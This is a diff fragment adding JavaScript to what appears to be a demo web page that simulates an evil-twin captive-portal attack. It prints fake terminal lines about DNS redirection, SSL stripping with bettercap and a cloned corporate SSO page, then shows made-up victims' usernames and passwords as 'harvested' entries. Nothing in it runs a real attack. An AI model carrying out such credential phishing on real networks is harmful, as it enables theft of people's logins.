+    const mm = String(now.getMinutes() + Math.floor(Math.random()*5)).padStart(2,'0');
+    const ss = String(Math.floor(Math.random()*59)).padStart(2,'0');
+    return `2024-03-15 ${hh}:${mm}:${ss}`;
+  }
+
+  function runPortalSim() {
+    const portalType = document.getElementById('portalType').value;
+    const sslMode    = document.getElementById('sslMode').value;
+    const output     = document.getElementById('portalOutput');
+    const harvestedSection = document.getElementById('harvestedSection');
+    const harvestedEntries = document.getElementById('harvestedEntries');
+
+    output.innerHTML = '';
+    harvestedSection.style.display = 'none';
+    harvestedEntries.innerHTML = '';
+
+    const portalNames = { wifi: 'WiFi Password Prompt', login: 'Generic Login Page', corporate: 'Corporate SSO Clone' };
+
+    const lines = [];
+    const append = (txt, delay) => setTimeout(() => {
+      output.innerHTML += txt + '\n';
+      output.scrollTop = output.scrollHeight;
+    }, delay);
+
+    append(`<span style="color:var(--accent2)">[*]</span> Portal type: <span style="color:var(--accent)">${portalNames[portalType]}</span>`, 0);
+    append(`<span style="color:var(--accent2)">[*]</span> DNS wildcard active → 10.0.0.1`, 300);
+    append(`<span style="color:var(--accent2)">[*]</span> nginx serving portal on :80`, 600);
+
+    if (sslMode === 'on') {
+      append(`<span style="color:var(--warn)">[*]</span> SSL stripping enabled via bettercap`, 900);
+      append(`<span style="color:var(--warn)">[*]</span> HTTPS → HTTP downgrade in progress...`, 1100);
+    }
+
+    append(``, 1400);
+    append(`<span style="color:var(--text-dim)">Waiting for clients to trigger portal...</span>`, 1500);
+
+    // Simulate victims connecting and submitting creds
+    const victims = fakeUsers.slice(0, portalType === 'corporate' ? 4 : 2);
+    const entries = [];
+
+    victims.forEach((v, i) => {
+      const delay = 2200 + i * 1800;
+      append(`<span style="color:var(--accent3)">[+]</span> Client ${v.ip} opened portal page`, delay);
+      append(`<span style="color:var(--accent3)">[+]</span> Client ${v.ip} submitted credentials!`, delay + 700);
+
+      setTimeout(() => {
+        const ts = randomTs();
+        entries.push({ ts, user: v.user, pass: v.pass, ip: v.ip });
+        renderHarvested(entries, harvestedSection, harvestedEntries);
+      }, delay + 800);
+    });
+
+    setTimeout(() => {
+      output.innerHTML += `\n<span style="color:var(--accent2)">[✓]</span> ${victims.length} credential set(s) harvested — see log below\n`;
+    }, 2200 + victims.length * 1800 + 400);
+  }
+
+  function renderHarvested(entries, section, container) {
+    section.style.display = 'block';
+    container.innerHTML = entries.map(e =>
+      `<div class="log-entry">
+        <span class="log-ts">[${e.ts}]</span>
+        <span class="log-ip"> IP=${e.ip}</span> |
+        <span class="log-user"> USER=${e.user}</span> |
+        <span class="log-pass"> PASS=${e.pass}</span>
+      </div>`
+    ).join('');
+  }
+</script>
+</body>
+</html>
